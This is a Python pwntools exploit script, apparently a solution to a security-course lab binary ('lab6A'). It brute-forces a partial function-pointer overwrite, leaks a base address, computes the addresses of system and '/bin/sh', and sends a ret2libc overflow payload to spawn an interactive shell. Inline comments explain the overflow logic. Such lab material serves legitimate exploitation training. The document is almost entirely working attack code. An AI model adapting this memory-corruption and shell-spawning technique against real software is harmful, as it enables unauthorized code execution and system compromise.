from pwn import *
# 000009e0 --> 0be2
# system: base - 0x19ce70
# /bin/sh: base - 0x7c5dc
while True:
    p = process("/levels/lab06/lab6A")

    p.recvuntil("Choice: ")
    p.sendline("1")

    p.recvuntil("name:")
    p.send("a"*32)

    p.recvuntil("description:")
    p.send("A"*90+"\xe2\x3b")

    p.recvuntil("Choice: ")
    p.sendline("3")

    try:
        leak = p.recvline()
        base_addr = u32(leak[-5:-1])-0xdd0
        system = base_addr - 0x19ce70
        sh_str = base_addr - 0x7c5dc
        
        log.info("Base addr: {}".format(hex(base_addr)))
        log.info("System addr: {}".format(hex(system)))
        log.info("/bin/sh addr: {}".format(hex(sh_str)))

        p.sendline("1")

        p.recvuntil("name:")
        p.send("b"*32)
        
        p.recvuntil("description:")
        p.send("B"*2+p32(base_addr+0x9af))
        # Overwrites the 2 higher bytes of sfunc and then
        # the following addr is the return from main
        # this is due to the user->desc + strlen(user->desc)
        # user-->desc is not zeroed so if we send 32 bytes of name
        # the strlen() will be until we overwrote the first time
        # so the two lower bytes of sfunc that we bruteforced
        # that's why we put junk on the two higher bytes since
        # we don't care anymore about sfunc and
        # directly overwrite the return from main
        p.sendline("4")

        p.recvuntil("listing")
        p.sendline("A"*52+p32(system) +"BBBB" + p32(sh_str))
        p.interactive()
        break
    except  EOFError:
        p.close()
        continue
